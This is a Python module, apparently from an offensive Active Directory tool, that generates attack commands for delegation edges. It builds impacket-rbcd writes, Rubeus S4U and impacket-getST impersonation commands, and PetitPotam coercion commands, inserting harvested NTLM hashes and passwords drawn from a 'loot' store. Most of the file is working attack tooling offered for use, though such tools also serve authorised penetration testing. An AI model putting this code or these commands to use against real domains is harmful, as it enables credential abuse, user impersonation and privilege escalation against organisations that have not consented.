from __future__ import annotations

from typing import Any, Dict, List, Tuple
from engine.commands import CommandProvider
from engine import state as est
import logging

log = logging.getLogger("nanohound.commands.delegation")


@CommandProvider.register("delegation")
def generate(source: Dict[str, Any], target: Dict[str, Any], domain: str, creds: Dict[str, Any] | None = None, network_context: Dict[str, Any] | None = None) -> List[Tuple[str, str]]:
    """Generate delegation-related commands: AllowedToDelegate, RBCD, AllowedToAuth.

    Signature: (source, target, domain, creds, network_context)
    """
    creds = creds or {}
    lm = getattr(est, "loot_manager", None)
    ge = getattr(est, "graph_engine", None)
    node_utils = CommandProvider.utils.node
    network = CommandProvider.utils.network
    edge = creds.get("edge") or creds.get("edge_type") or ""
    src = source or {}
    tgt = target or {}

    results: List[Tuple[str, str]] = []

    # Legacy monolith removed; rely on provider logic and local heuristics

    def _has_machine_account_hash() -> bool:
        try:
            if not lm:
                return False
            all_creds = lm.all_credentials() if hasattr(lm, "all_credentials") else []
            for cred in all_creds:
                principal = (getattr(cred, "principal", None) or getattr(cred, "username", None) or "")
                principal = str(principal).strip()
                ntlm = (getattr(cred, "ntlm_hash", None) or "").strip()
                if not ntlm:
                    continue
                if principal.endswith("$"):
                    return True
        except Exception:
            pass
        return False

    def _auth_part(node: Dict[str, Any]) -> str:
        cred = node_utils.get_credential_record(lm, ge, type("N", (), node) if isinstance(node, dict) else node)
        if cred:
            # Prefer using auth flags helper
            try:
                flags = node_utils.auth_flags(lm, type("N", (), node) if isinstance(node, dict) else node)
                if flags:
                    return f" {flags}"
            except Exception:
                pass
            user = getattr(cred, "username", node.get("name", "<USER>")) if isinstance(node, dict) else getattr(cred, "username", getattr(node, "name", "<USER>"))
            pwd = getattr(cred, "password", getattr(cred, "ntlm_hash", "<PASSWORD>"))
            return f" -u {user} -p '{pwd}'"
        return ""

    # RBCD / CanConfigureRBCD guidance (write msDS-AllowedToActOnBehalfOfOtherIdentity)
    if edge in ("CanConfigureRBCD", "RBCD", "AddAllowedToAct", "AllowedToAct"):
        target_computer = tgt.get("name", "<TARGET_COMPUTER>")
        controlled_computer = src.get("name", "<CONTROLLED_COMPUTER$>")
        username = src.get("name", "<SOURCE_USER>")
        dc_ip = network.find_dc_for_domain(domain, prefer_ip=True) or (getattr(est, "graph_engine", None) and getattr(est.graph_engine, "find_dc_for_domain", lambda d, prefer_ip=False: None)(domain, prefer_ip=True)) or "<DC_IP>"
        auth_flags = _auth_part(src)

        # Nmap port hint for remote services relevant to AD (LDAP/LDAPS/SMB/HTTP)
        nmap_hint = "nmap -p 88,135,139,389,445,636,3268 --open <TARGET_HOST>"

        # If we don't have a machine account hash in loot, instruct operator to obtain one first.
        if not _has_machine_account_hash():
            return [
                (
                    "RBCD pre-req",
                    "# PRE-REQ: No machine account NTLM hash found in Loot.\n"
                    "# Step 1: Create or obtain a machine account and capture its NTLM hash.\n"
                    "# Example (obtain a machine account via domain join / provisioning):\n"
                    "#   impacket-addcomputer <DOMAIN>/<MACHINE$> -password '<PASSWORD>'\n"
                    "# After acquiring a machine account NTLM hash, store it in the Loot table and re-run this command.\n"
                    "# AllowedToAct / AddAllowedToAct: abuse resource-based constrained delegation (RBCD)\n"
                    f"impacket-rbcd -dc-ip {dc_ip} -action write -delegate-from '{controlled_computer}' -delegate-to '{target_computer}' {domain}/{username}{auth_flags}\n"
                    f"# Quick port scan hint: {nmap_hint}\n"
                    "# Follow up: use Rubeus to perform S4U and impersonation steps."
                )
            ]

        # Have machine hash: provide RBCD write and follow-up S4U example
        # Use available machine account hash to build impacket auth flags
        machine_flags = node_utils.auth_flags(lm, type("N", (), src) if isinstance(src, dict) else src)

        # Provide both the write step and the ticket acquisition example
        return [
            (
                "RBCD write + S4U follow-up",
                f"impacket-rbcd -dc-ip {dc_ip} -action write -delegate-from '{controlled_computer}' -delegate-to '{target_computer}' {domain}/{username} {machine_flags}\n"
                "# Follow up with S4U to impersonate a user to the target service\n"
                f"Rubeus.exe s4u /user:{controlled_computer} /rc4:<RC4_HASH> /impersonateuser:<TARGET_USER> /msdsspn:cifs/{target_computer} /ptt\n"
                "# Example (Impacket getST):\n"
                f"impacket-getST -impersonate <VICTIM_USER>@{domain} -spn cifs/{target_computer} {domain}/{controlled_computer} {machine_flags}"
            )
        ]

    # AllowedToAuth (Protocol Transition): guidance for protocol transition abuse
    if edge == "AllowedToAuth":
        return [
            (
                "Protocol Transition (AllowedToAuth)",
                "# AllowedToAuth: use protocol transition (S4U2Self/S4U2Proxy) flows with a service that accepts constrained/unconstrained delegation. Consider S4U2Self + S4U2Proxy flows."
            )
        ]

    # Unconstrained delegation: describe coercion/poisoning steps
    if edge == "UnconstrainedDelegation" or tgt.get("unconstraineddelegation"):
        target_host = tgt.get("name", "<TARGET_HOST>")
        return [
            ("Coercion - PetitPotam example", f"Invoke-PetitPotam -Target {target_host} -DC <DC_HOST>"),
            ("Coercion - SpoolSample (PrinterBug) hint", "# Use NTLM coercion primitives (PetitPotam/PrinterBug/SpoolSample) to force auth to target host, then perform token theft or relay."),
        ]

    return results
